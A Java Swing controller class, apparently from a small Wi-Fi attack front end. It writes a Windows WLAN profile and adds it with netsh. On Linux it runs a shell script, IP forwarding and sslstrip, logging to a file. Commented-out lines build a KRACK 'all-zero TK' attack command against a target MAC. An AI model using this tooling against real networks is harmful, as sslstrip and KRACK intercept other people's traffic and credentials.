package controller;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import view.MainView;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;


public class controllerMain implements ActionListener{
	view.JFrameView mv;
	public controllerMain(view.JFrameView MV)
	{
		mv = MV;
	}
	@Override
	public void actionPerformed(ActionEvent e) 
	{
		if(e.getSource()==view.MainView.run)
		{
			runScripts(view.MainView.targetNetworkInput.getText(),view.MainView.targetMACInput.getText());
		}
		else if(e.getSource()==view.MainView.exit)
		{
			mv.frame.dispose();
			mv.frame = null;
			System.exit(0);
		}
		
	}
	private void createSHFile(String network, String MAC)
	{/*
		String fp = "sudo ./krack-all-zero-tk.py wlp0s20u1 wlp0s20u2 ";
		String sp = " --target ";
		String FinalLINUX = fp+network+sp+MAC;
		*/
		//File mySH = new File("runSH.sh");
		File myBAT = new File("network.xml");
		
		//String fpW = "start krack-all-zero-tk.py wlp0s20u1 wlp0s20u2 ";
		//String FinalWINDOWS = fpW+network+sp+MAC;
		
		String cmdCommand = String.format("<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>%s</name><SSIDConfig><SSID><name>%s</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>auto</connectionMode><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>%s</keyMaterial></sharedKey></security></MSM><MacRandomization xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v3\"><enableRandomization>false</enableRandomization></MacRandomization></WLANProfile>", network, network, MAC);
		/*
		 try {
		      FileWriter myWriter = new FileWriter("runSH.sh");
		      //myWriter.write(FinalLINUX);
		      myWriter.close();
		    } catch (IOException e) {
		      System.out.println("An error occurred.");
		}
		*/
		 try {
		      FileWriter myWriter = new FileWriter("network.xml");
		      myWriter.write(cmdCommand);
		      myWriter.close();
		    } catch (IOException e) {
		      System.out.println("An error occurred.");
		}
	}
	private void runScripts(String network, String MAC)
	{
		System.out.println(network);
		System.out.println(MAC);
		createSHFile(network, MAC);
		boolean isWindows = System.getProperty("os.name").toLowerCase().startsWith("windows");
		if(isWindows)
		{
			try { // /c @echo off&cls /c ping -n 2 www.google.com >nul && echo connected || echo not connected
				
				Process process = Runtime.getRuntime().exec("cmd /c netsh wlan add profile filename=\"network.xml\"");
				printResults(process);
				Process process2 = Runtime.getRuntime().exec("cmd /c @echo off&cls /c ping -n 2 www.google.com >nul && echo connected || echo not connected");
				printResults(process2);
			} catch (IOException e) {
				System.out.println("ERROR: Command line execution failed.");
			}
		}else
		{
			try {
				Process process = Runtime.getRuntime().exec("sudo ./runSH.sh; ./enable_internet_forwarding.sh; sslstrip -w sslstrip.log");
				printResults(process);
			} catch (IOException e) {
				System.out.println("ERROR: Command line execution failed.");
			}
		}
		/*
		
		*/
	}
	
	private static void printResults(Process process) throws IOException {
	    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
	    String line = "";
	    while ((line = reader.readLine()) != null) {
	        System.out.println(line);
	    }
	}

}
